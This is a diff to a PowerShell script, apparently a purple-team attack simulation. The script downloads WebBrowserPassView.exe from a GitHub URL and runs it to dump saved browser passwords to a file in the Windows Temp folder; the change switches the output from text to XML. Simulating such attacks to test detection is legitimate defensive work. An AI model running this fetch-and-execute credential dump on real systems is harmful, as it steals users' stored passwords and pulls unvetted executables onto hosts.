@@ -9,13 +9,13 @@ Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
 
 # Download and execute WebBrowserPassView.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
 $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WebBrowserPassView.exe"
-$dumpfile = "$env:windir\Temp\BrowserPass.txt"
+$dumpfile = "$env:windir\Temp\BrowserPass.xml"
 $outfile = "$env:tmp\BrowserPass.exe"
 try {
     Invoke-WebRequest $url -OutFile $outfile 
     if (Test-Path $outfile){
         Write-Host -ForegroundColor Green "Success: WebBrowserPassView.exe downloaded to $outfile"
-        & $outfile /stext $dumpfile
+        & $outfile /sxml $dumpfile
     }
     else{
         Write-Host -ForegroundColor Red "Error: Failed to download WebBrowserPassView.exe, $dumpfile not found."
